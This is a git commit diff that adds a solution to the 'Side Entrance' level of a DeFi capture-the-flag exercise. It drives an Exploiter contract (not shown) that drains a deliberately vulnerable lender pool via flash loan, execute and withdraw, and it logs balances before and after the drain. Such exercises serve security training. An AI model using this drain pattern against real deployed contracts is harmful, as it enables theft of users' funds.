ad781f8a19ba833f9ec2b4ac50cba7205578abd6
omar-ahsan <106596821+omar-ahsan@users.noreply.github.com>
2023-11-23 02:52:06 +0500

    DVD Challenge 4 : SideEntrace Completed

--- test/Levels/side-entrance/SideEntrance.t.sol
+++ test/Levels/side-entrance/SideEntrance.t.sol
@@ -5,6 +5,7 @@ import {Utilities} from "../../utils/Utilities.sol";
 import "forge-std/Test.sol";
 
 import {SideEntranceLenderPool} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";
+import {Exploiter} from "../../../src/Contracts/side-entrance/Exploiter.sol";
 
 contract SideEntrance is Test {
     uint256 internal constant ETHER_IN_POOL = 1_000e18;
@@ -12,7 +13,8 @@ contract SideEntrance is Test {
     Utilities internal utils;
     SideEntranceLenderPool internal sideEntranceLenderPool;
     address payable internal attacker;
-    uint256 public attackerInitialEthBalance;
+    uint256 public attackerInitialEthBalance = 0e18;
+    uint256 public zeroValue = 0;
 
     function setUp() public {
         utils = new Utilities();
@@ -29,6 +31,8 @@ contract SideEntrance is Test {
 
         attackerInitialEthBalance = address(attacker).balance;
 
+        //console.log("Balance of Attacker before Attack (In Set Up) : ", address(attacker).balance);
+
         console.log(unicode"🧨 Let's see if you can break it... 🧨");
     }
 
@@ -36,6 +40,19 @@ contract SideEntrance is Test {
         /**
          * EXPLOIT START *
          */
+        vm.startPrank(attacker);
+        Exploiter exploit;
+        exploit = new Exploiter(address(sideEntranceLenderPool));
+
+        console.log("Balance of Attacker before Attack : ", attackerInitialEthBalance);
+        console.log("Balance of Pool before Attack : ", address(sideEntranceLenderPool).balance);
+
+        exploit.attackContract(address(sideEntranceLenderPool).balance); // calling the attackContract function which calls flashloan and withdraw. flashloan extends to execute which is the interface function
+
+        vm.stopPrank();
+
+        console.log("Balance of Attacker after Attack : ", address(attacker).balance);
+        console.log("Balance of Pool after Attack : ", address(sideEntranceLenderPool).balance);
 
         /**
          * EXPLOIT END *
